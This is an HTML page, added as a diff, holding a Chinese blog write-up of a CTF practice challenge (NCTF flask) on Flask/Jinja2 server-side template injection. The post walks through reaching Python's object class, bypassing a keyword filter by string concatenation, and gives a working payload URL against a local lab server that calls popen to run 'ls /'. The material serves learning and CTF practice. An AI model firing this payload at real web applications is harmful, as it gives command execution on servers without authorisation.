@@ -1,0 +1,299 @@
+<!DOCTYPE html>
+<html lang=zh>
+<head><meta name="generator" content="Hexo 3.8.0">
+    <!-- so meta -->
+    <meta charset="utf-8">
+    <meta http-equiv="X-UA-Compatible" content="IE=edge">
+    <meta name="HandheldFriendly" content="True">
+    <meta name="viewport" content="width=device-width, initial-scale=1, maximum-scale=1">
+    <meta name="description" content="模版注入专题（沙箱绕过）Flask以NCTF flask 为例 先前说明我们在python的object类中集成了很多的基础函数，我们这里的最主要考虑就是想办法得到object。 获得object12345&amp;apos;&amp;apos;.__class__.__mro__[2]&amp;#123;&amp;#125;.__class__.__bases__[0]().__class__.__bases__[0][]._">
+<meta name="keywords" content="Note,Writeup">
+<meta property="og:type" content="article">
+<meta property="og:title" content="个人练习WP Week 5 A（模版注入）">
+<meta property="og:url" content="http:/blog.boyblog.club/2019/07/08/Week5-A/index.html">
+<meta property="og:site_name" content="Sndav Blog">
+<meta property="og:description" content="模版注入专题（沙箱绕过）Flask以NCTF flask 为例 先前说明我们在python的object类中集成了很多的基础函数，我们这里的最主要考虑就是想办法得到object。 获得object12345&amp;apos;&amp;apos;.__class__.__mro__[2]&amp;#123;&amp;#125;.__class__.__bases__[0]().__class__.__bases__[0][]._">
+<meta property="og:locale" content="zh-Hasn">
+<meta property="og:image" content="https://live.staticflickr.com/65535/48236974081_fc322c21d2_o.png">
+<meta property="og:image" content="https://live.staticflickr.com/65535/48237059267_3673a6e857_o.png">
+<meta property="og:image" content="https://live.staticflickr.com/65535/48237060152_3e720f71c2_o.png">
+<meta property="og:image" content="https://live.staticflickr.com/65535/48236975411_c991a2a21d_o.png">
+<meta property="og:image" content="https://live.staticflickr.com/65535/48236974536_32c6b6c872_o.png">
+<meta property="og:updated_time" content="2019-07-09T06:04:17.951Z">
+<meta name="twitter:card" content="summary">
+<meta name="twitter:title" content="个人练习WP Week 5 A（模版注入）">
+<meta name="twitter:description" content="模版注入专题（沙箱绕过）Flask以NCTF flask 为例 先前说明我们在python的object类中集成了很多的基础函数，我们这里的最主要考虑就是想办法得到object。 获得object12345&amp;apos;&amp;apos;.__class__.__mro__[2]&amp;#123;&amp;#125;.__class__.__bases__[0]().__class__.__bases__[0][]._">
+<meta name="twitter:image" content="https://live.staticflickr.com/65535/48236974081_fc322c21d2_o.png">
+    
+    
+        
+          
+              <link rel="shortcut icon" href="/images/favicon.ico">
+          
+        
+        
+          
+            <link rel="icon" type="image/png" href="/images/favicon-192x192.png" sizes="192x192">
+          
+        
+        
+          
+            <link rel="apple-touch-icon" sizes="180x180" href="/images/apple-touch-icon.png">
+          
+        
+    
+    <!-- title -->
+    <title>个人练习WP Week 5 A（模版注入）</title>
+    <!-- styles -->
+    <link rel="stylesheet" href="/css/style.css">
+    <!-- persian styles -->
+    
+      <link rel="stylesheet" href="/css/rtl.css">
+    
+    <!-- rss -->
+    
+    
+</head>
+
+<body class="max-width mx-auto px3 ltr">
+    
+      <div id="header-post">
+  <a id="menu-icon" href="#"><i class="fas fa-bars fa-lg"></i></a>
+  <a id="menu-icon-tablet" href="#"><i class="fas fa-bars fa-lg"></i></a>
+  <a id="top-icon-tablet" href="#" onclick="$('html, body').animate({ scrollTop: 0 }, 'fast');" style="display:none;"><i class="fas fa-chevron-up fa-lg"></i></a>
+  <span id="menu">
+    <span id="nav">
+      <ul>
+         
+          <li><a href="/">Home</a></li>
+         
+          <li><a href="/archives">Writing</a></li>
+         
+          <li><a href="/tags">Tags</a></li>
+         
+          <li><a href="/categories/">Categories</a></li>
+         
+          <li><a href="/search/">Search</a></li>
+        
+      </ul>
+    </span>
+    <br>
+    <span id="actions">
+      <ul>
+        
+        <li><a class="icon" href="/2019/07/08/Week4-C/"><i class="fas fa-chevron-left" aria-hidden="true" onmouseover="$('#i-prev').toggle();" onmouseout="$('#i-prev').toggle();"></i></a></li>
+        
+        
+        <li><a class="icon" href="/2019/07/08/Week7-B/"><i class="fas fa-chevron-right" aria-hidden="true" onmouseover="$('#i-next').toggle();" onmouseout="$('#i-next').toggle();"></i></a></li>
+        
+        <li><a class="icon" href="#" onclick="$('html, body').animate({ scrollTop: 0 }, 'fast');"><i class="fas fa-chevron-up" aria-hidden="true" onmouseover="$('#i-top').toggle();" onmouseout="$('#i-top').toggle();"></i></a></li>
+        <li><a class="icon" href="#"><i class="fas fa-share-alt" aria-hidden="true" onmouseover="$('#i-share').toggle();" onmouseout="$('#i-share').toggle();" onclick="$('#share').toggle();return false;"></i></a></li>
+      </ul>
+      <span id="i-prev" class="info" style="display:none;">Previous post</span>
+      <span id="i-next" class="info" style="display:none;">Next post</span>
+      <span id="i-top" class="info" style="display:none;">Back to top</span>
+      <span id="i-share" class="info" style="display:none;">Share post</span>
+    </span>
+    <br>
+    <div id="share" style="display: none">
+      <ul>
+  <li><a class="icon" href="http://www.facebook.com/sharer.php?u=http:/blog.boyblog.club/2019/07/08/Week5-A/"><i class="fab fa-facebook " aria-hidden="true"></i></a></li>
+  <li><a class="icon" href="https://twitter.com/share?url=http:/blog.boyblog.club/2019/07/08/Week5-A/&text=个人练习WP Week 5 A（模版注入）"><i class="fab fa-twitter " aria-hidden="true"></i></a></li>
+  <li><a class="icon" href="http://www.linkedin.com/shareArticle?url=http:/blog.boyblog.club/2019/07/08/Week5-A/&title=个人练习WP Week 5 A（模版注入）"><i class="fab fa-linkedin " aria-hidden="true"></i></a></li>
+  <li><a class="icon" href="https://pinterest.com/pin/create/bookmarklet/?url=http:/blog.boyblog.club/2019/07/08/Week5-A/&is_video=false&description=个人练习WP Week 5 A（模版注入）"><i class="fab fa-pinterest " aria-hidden="true"></i></a></li>
+  <li><a class="icon" href="mailto:?subject=个人练习WP Week 5 A（模版注入）&body=Check out this article: http:/blog.boyblog.club/2019/07/08/Week5-A/"><i class="fas fa-envelope " aria-hidden="true"></i></a></li>
+  <li><a class="icon" href="https://getpocket.com/save?url=http:/blog.boyblog.club/2019/07/08/Week5-A/&title=个人练习WP Week 5 A（模版注入）"><i class="fab fa-get-pocket " aria-hidden="true"></i></a></li>
+  <li><a class="icon" href="http://reddit.com/submit?url=http:/blog.boyblog.club/2019/07/08/Week5-A/&title=个人练习WP Week 5 A（模版注入）"><i class="fab fa-reddit " aria-hidden="true"></i></a></li>
+  <li><a class="icon" href="http://www.stumbleupon.com/submit?url=http:/blog.boyblog.club/2019/07/08/Week5-A/&title=个人练习WP Week 5 A（模版注入）"><i class="fab fa-stumbleupon " aria-hidden="true"></i></a></li>
+  <li><a class="icon" href="http://digg.com/submit?url=http:/blog.boyblog.club/2019/07/08/Week5-A/&title=个人练习WP Week 5 A（模版注入）"><i class="fab fa-digg " aria-hidden="true"></i></a></li>
+  <li><a class="icon" href="http://www.tumblr.com/share/link?url=http:/blog.boyblog.club/2019/07/08/Week5-A/&name=个人练习WP Week 5 A（模版注入）&description="><i class="fab fa-tumblr " aria-hidden="true"></i></a></li>
+</ul>
+
+    </div>
+    <div id="toc">
+      <ol class="toc"><li class="toc-item toc-level-1"><a class="toc-link" href="#模版注入专题（沙箱绕过）Flask"><span class="toc-number">1.</span> <span class="toc-text">模版注入专题（沙箱绕过）Flask</span></a><ol class="toc-child"><li class="toc-item toc-level-2"><a class="toc-link" href="#先前说明"><span class="toc-number">1.1.</span> <span class="toc-text">先前说明</span></a><ol class="toc-child"><li class="toc-item toc-level-3"><a class="toc-link" href="#获得object"><span class="toc-number">1.1.1.</span> <span class="toc-text">获得object</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#后续利用"><span class="toc-number">1.1.2.</span> <span class="toc-text">后续利用</span></a></li></ol></li><li class="toc-item toc-level-2"><a class="toc-link" href="#题解"><span class="toc-number">1.2.</span> <span class="toc-text">题解</span></a><ol class="toc-child"><li class="toc-item toc-level-3"><a class="toc-link" href="#第一步我们怎么获得object呢？"><span class="toc-number">1.2.1.</span> <span class="toc-text">第一步我们怎么获得object呢？</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#获得可以利用的类"><span class="toc-number">1.2.2.</span> <span class="toc-text">获得可以利用的类</span></a></li></ol></li></ol></li></ol>
+    </div>
+  </span>
+</div>
+
+    
+    <div class="content index py4">
+        
+        <article class="post" itemscope itemtype="http://schema.org/BlogPosting">
+  <header>
+    
+    <h1 class="posttitle" itemprop="name headline">
+        个人练习WP Week 5 A（模版注入）
+    </h1>
+
+
+
+    <div class="meta">
+      <span class="author" itemprop="author" itemscope itemtype="http://schema.org/Person">
+        <span itemprop="name">Sndav Blog</span>
+      </span>
+      
+    <div class="postdate">
+      
+        <time datetime="2019-07-08T12:26:53.000Z" itemprop="datePublished">2019-07-08</time>
+        
+      
+    </div>
+
+
+      
+
+      
+    <div class="article-tag">
+        <i class="fas fa-tag"></i>
+        <a class="tag-link" href="/tags/Note/">Note</a>, <a class="tag-link" href="/tags/Writeup/">Writeup</a>
+    </div>
+
+
+    </div>
+  </header>
+  
+
+  <div class="content" itemprop="articleBody">
+    <h1 id="模版注入专题（沙箱绕过）Flask"><a href="#模版注入专题（沙箱绕过）Flask" class="headerlink" title="模版注入专题（沙箱绕过）Flask"></a>模版注入专题（沙箱绕过）Flask</h1><p>以NCTF flask 为例</p>
+<h2 id="先前说明"><a href="#先前说明" class="headerlink" title="先前说明"></a>先前说明</h2><p>我们在python的object类中集成了很多的基础函数，我们这里的最主要考虑就是想办法得到object。</p>
+<h3 id="获得object"><a href="#获得object" class="headerlink" title="获得object"></a>获得object</h3><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">&apos;&apos;.__class__.__mro__[2]</span><br><span class="line">&#123;&#125;.__class__.__bases__[0]</span><br><span class="line">().__class__.__bases__[0]</span><br><span class="line">[].__class__.__bases__[0]</span><br><span class="line">request.__class__.__mro__[8]</span><br></pre></td></tr></table></figure>
+<p>之后通过<code>__subclasses__</code>里的相关类可以参考利用</p>
+<p>在flask我们可以从</p>
+<ul>
+<li><code>config</code>, the current configuration object</li>
+<li><code>request</code>, the current request object</li>
+<li><code>session</code>, the current session object</li>
+<li><code>g</code>, the request-bound object for global variables. This is usually used by the developer to store resources during a request.</li>
+</ul>
+<p>这几个角度开始入手</p>
+<h3 id="后续利用"><a href="#后续利用" class="headerlink" title="后续利用"></a>后续利用</h3><ul>
+<li>request</li>
+<li>Config</li>
+<li>ftplib</li>
+<li>httplib</li>
+<li>file</li>
+<li>os._wrap_close.popen</li>
+</ul>
+<h2 id="题解"><a href="#题解" class="headerlink" title="题解"></a>题解</h2><p><code>http://127.0.0.1:19008/2</code></p>
+<p><img src="https://live.staticflickr.com/65535/48236974081_fc322c21d2_o.png" alt></p>
+<p>考虑模版注入</p>
+<p>通过burp检测过滤关键字</p>
+<p><img src="https://live.staticflickr.com/65535/48237059267_3673a6e857_o.png" alt></p>
+<p>config class mro args request open eval builtins import</p>
+<p>这些词语被过滤</p>
+<p>我们怎么操作呢。</p>
+<h3 id="第一步我们怎么获得object呢？"><a href="#第一步我们怎么获得object呢？" class="headerlink" title="第一步我们怎么获得object呢？"></a>第一步我们怎么获得object呢？</h3><p><img src="https://live.staticflickr.com/65535/48237060152_3e720f71c2_o.png" alt></p>
+<p>在flask模版中我们有以上两个等价。</p>
+<p>因此我们可以通过字符拼接绕过</p>
+<p><code>&quot;&quot;[&quot;__cl&quot;+&quot;ass__&quot;].__base__</code> == <code>&quot;&quot;.__class__.__base__</code> == <code>object</code></p>
+<p>这里还有一种方法<code>|attr(&quot;&quot;)</code></p>
+<p>通过此我们便可以得到object类</p>
+<h3 id="获得可以利用的类"><a href="#获得可以利用的类" class="headerlink" title="获得可以利用的类"></a>获得可以利用的类</h3><p>通过<code>object.__subclasses__()</code>我们可以看到</p>
+<p><img src="https://live.staticflickr.com/65535/48236975411_c991a2a21d_o.png" alt></p>
+<p>这其中都是我们可以利用的类。</p>
+<p>搜索上述关键字，我们可以找到popen</p>
+<p>通过构造</p>
+<p><code>http://127.0.0.1:19008/%7B%7B&#39;&#39;[&quot;__c&quot;+&quot;lass__&quot;][&quot;__m&quot;+&quot;ro__&quot;][1][&quot;__subcl&quot;+&quot;asses__&quot;]()[20].__init__.__globals__[&quot;pop&quot;+&quot;en&quot;](&quot;ls%20/&quot;).read()%7D%7D</code></p>
+<p>我们可以得到</p>
+<p><img src="https://live.staticflickr.com/65535/48236974536_32c6b6c872_o.png" alt></p>
+
+  </div>
+</article>
+
+
+
+        
+          <div id="footer-post-container">
+  <div id="footer-post">
+
+    <div id="nav-footer" style="display: none">
+      <ul>
+         
+          <li><a href="/">Home</a></li>
+         
+          <li><a href="/archives">Writing</a></li>
+         
+          <li><a href="/tags">Tags</a></li>
+         
+          <li><a href="/categories/">Categories</a></li>
+         
+          <li><a href="/search/">Search</a></li>
+        
+      </ul>
+    </div>
+
+    <div id="toc-footer" style="display: none">
+      <ol class="toc"><li class="toc-item toc-level-1"><a class="toc-link" href="#模版注入专题（沙箱绕过）Flask"><span class="toc-number">1.</span> <span class="toc-text">模版注入专题（沙箱绕过）Flask</span></a><ol class="toc-child"><li class="toc-item toc-level-2"><a class="toc-link" href="#先前说明"><span class="toc-number">1.1.</span> <span class="toc-text">先前说明</span></a><ol class="toc-child"><li class="toc-item toc-level-3"><a class="toc-link" href="#获得object"><span class="toc-number">1.1.1.</span> <span class="toc-text">获得object</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#后续利用"><span class="toc-number">1.1.2.</span> <span class="toc-text">后续利用</span></a></li></ol></li><li class="toc-item toc-level-2"><a class="toc-link" href="#题解"><span class="toc-number">1.2.</span> <span class="toc-text">题解</span></a><ol class="toc-child"><li class="toc-item toc-level-3"><a class="toc-link" href="#第一步我们怎么获得object呢？"><span class="toc-number">1.2.1.</span> <span class="toc-text">第一步我们怎么获得object呢？</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#获得可以利用的类"><span class="toc-number">1.2.2.</span> <span class="toc-text">获得可以利用的类</span></a></li></ol></li></ol></li></ol>
+    </div>
+
+    <div id="share-footer" style="display: none">
+      <ul>
+  <li><a class="icon" href="http://www.facebook.com/sharer.php?u=http:/blog.boyblog.club/2019/07/08/Week5-A/"><i class="fab fa-facebook fa-lg" aria-hidden="true"></i></a></li>
+  <li><a class="icon" href="https://twitter.com/share?url=http:/blog.boyblog.club/2019/07/08/Week5-A/&text=个人练习WP Week 5 A（模版注入）"><i class="fab fa-twitter fa-lg" aria-hidden="true"></i></a></li>
+  <li><a class="icon" href="http://www.linkedin.com/shareArticle?url=http:/blog.boyblog.club/2019/07/08/Week5-A/&title=个人练习WP Week 5 A（模版注入）"><i class="fab fa-linkedin fa-lg" aria-hidden="true"></i></a></li>
+  <li><a class="icon" href="https://pinterest.com/pin/create/bookmarklet/?url=http:/blog.boyblog.club/2019/07/08/Week5-A/&is_video=false&description=个人练习WP Week 5 A（模版注入）"><i class="fab fa-pinterest fa-lg" aria-hidden="true"></i></a></li>
+  <li><a class="icon" href="mailto:?subject=个人练习WP Week 5 A（模版注入）&body=Check out this article: http:/blog.boyblog.club/2019/07/08/Week5-A/"><i class="fas fa-envelope fa-lg" aria-hidden="true"></i></a></li>
+  <li><a class="icon" href="https://getpocket.com/save?url=http:/blog.boyblog.club/2019/07/08/Week5-A/&title=个人练习WP Week 5 A（模版注入）"><i class="fab fa-get-pocket fa-lg" aria-hidden="true"></i></a></li>
+  <li><a class="icon" href="http://reddit.com/submit?url=http:/blog.boyblog.club/2019/07/08/Week5-A/&title=个人练习WP Week 5 A（模版注入）"><i class="fab fa-reddit fa-lg" aria-hidden="true"></i></a></li>
+  <li><a class="icon" href="http://www.stumbleupon.com/submit?url=http:/blog.boyblog.club/2019/07/08/Week5-A/&title=个人练习WP Week 5 A（模版注入）"><i class="fab fa-stumbleupon fa-lg" aria-hidden="true"></i></a></li>
+  <li><a class="icon" href="http://digg.com/submit?url=http:/blog.boyblog.club/2019/07/08/Week5-A/&title=个人练习WP Week 5 A（模版注入）"><i class="fab fa-digg fa-lg" aria-hidden="true"></i></a></li>
+  <li><a class="icon" href="http://www.tumblr.com/share/link?url=http:/blog.boyblog.club/2019/07/08/Week5-A/&name=个人练习WP Week 5 A（模版注入）&description="><i class="fab fa-tumblr fa-lg" aria-hidden="true"></i></a></li>
+</ul>
+
+    </div>
+
+    <div id="actions-footer">
+        <a id="menu" class="icon" href="#" onclick="$('#nav-footer').toggle();return false;"><i class="fas fa-bars fa-lg" aria-hidden="true"></i> Menu</a>
+        <a id="toc" class="icon" href="#" onclick="$('#toc-footer').toggle();return false;"><i class="fas fa-list fa-lg" aria-hidden="true"></i> TOC</a>
+        <a id="share" class="icon" href="#" onclick="$('#share-footer').toggle();return false;"><i class="fas fa-share-alt fa-lg" aria-hidden="true"></i> Share</a>
+        <a id="top" style="display:none" class="icon" href="#" onclick="$('html, body').animate({ scrollTop: 0 }, 'fast');"><i class="fas fa-chevron-up fa-lg" aria-hidden="true"></i> Top</a>
+    </div>
+
+  </div>
+</div>
+
+        
+        <footer id="footer">
+  <div class="footer-left">
+    Copyright &copy; 2019 Sndav@Dubhe
+  </div>
+  <div class="footer-right">
+    <nav>
+      <ul>
+         
+          <li><a href="/">Home</a></li>
+         
+          <li><a href="/archives">Writing</a></li>
+         
+          <li><a href="/tags">Tags</a></li>
+         
+          <li><a href="/categories/">Categories</a></li>
+         
+          <li><a href="/search/">Search</a></li>
+        
+      </ul>
+    </nav>
+  </div>
+</footer>
+
+    </div>
+    <!-- styles -->
+<link rel="stylesheet" href="/lib/font-awesome/css/all.min.css">
+<link rel="stylesheet" href="/lib/justified-gallery/css/justifiedGallery.min.css">
+
+    <!-- jquery -->
+<script src="/lib/jquery/jquery.min.js"></script>
+<script src="/lib/justified-gallery/js/jquery.justifiedGallery.min.js"></script>
+<script src="/js/main.js"></script>
+<!-- search -->
+
+<!-- Google Analytics -->
+
+<!-- Baidu Analytics -->
+
+<!-- Disqus Comments -->
+
+
+</body>
+</html>
